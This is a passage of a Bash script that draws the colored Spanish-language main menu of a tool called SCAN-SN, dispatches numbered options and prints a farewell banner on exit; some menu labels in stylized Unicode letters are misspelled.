        echo -e "${MORADO}║${NC}  ${AMARILLO}[10]${NC} 𝙰𝚘𝚜𝚝𝚛𝚖𝚛 𝙷𝚘𝚜𝚝𝚜 𝙶𝚞𝚊𝚛𝚍𝚊𝚍𝚘𝚜                       ${MORADO}║${NC}"
        echo -e "${MORADO}║${NC}  ${AMARILLO}[11]${NC} 𝙰𝚒𝚜𝚝𝚘𝚛𝚒𝚊𝚕 𝚍𝚎 𝙰𝚌𝚝𝚒𝚟𝚒𝚕𝚞𝚍𝚎𝚜                       ${MORADO}║${NC}"
        echo -e "${MORADO}║${NC}                                                            ${MORADO}║${NC}"
        echo -e "${MORADO}║${NC}  ${ROJO}[0]${NC} 𝚂𝚊𝚕𝚒𝚛                                           ${MORADO}║${NC}"
        echo -e "${MORADO}╚════════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        read -p "$(echo -e ${AMARILLO}𝚂𝚎𝚠𝚎𝚌𝚌𝚒ó𝚗:${NC} )" opcion
        
        case $opcion in
            1) opcion_1 ;;
            2) opcion_2 ;;
            3) opcion_3 ;;
            4) opcion_4 ;;
            5) opcion_5 ;;
            6) opcion_6 ;;
            7) opcion_7 ;;
            8) opcion_8 ;;
            9) opcion_9 ;;
            10) opcion_10 ;;
            11) opcion_11 ;;
            0)
                banner
                echo -e "${VERDE}"
                echo "╔════════════════════════════════════════════════════════════════╗"
                echo "║                                                                ║"
                echo "║              𝙶𝚛𝚊𝚌𝚒𝚊𝚜 𝚙𝚘𝚛 𝚞𝚜𝚊𝚛 𝐒𝐂𝐀𝐍-𝐒𝐍               ║"
                echo "║                                                                ║"
                echo "║                  ¡𝙽𝚞𝚗𝚌𝚊 𝚍𝚎𝚓𝚎𝚜 𝚍𝚎 𝚊𝚙𝚛𝚎𝚗𝚍𝚎𝚛! 🚀                  ║"
                echo "║                                                                ║"
                echo "╚════════════════════════════════════════════════════════════════╝"
                echo -e "${NC}"
                registrar "Programa finalizado"
                exit 0
                ;;
            *)
                error "𝙰𝚢𝚌𝚒ó𝚗 𝚒𝚗𝚟á𝚘𝚒𝚍𝚊"
                sleep 2
     
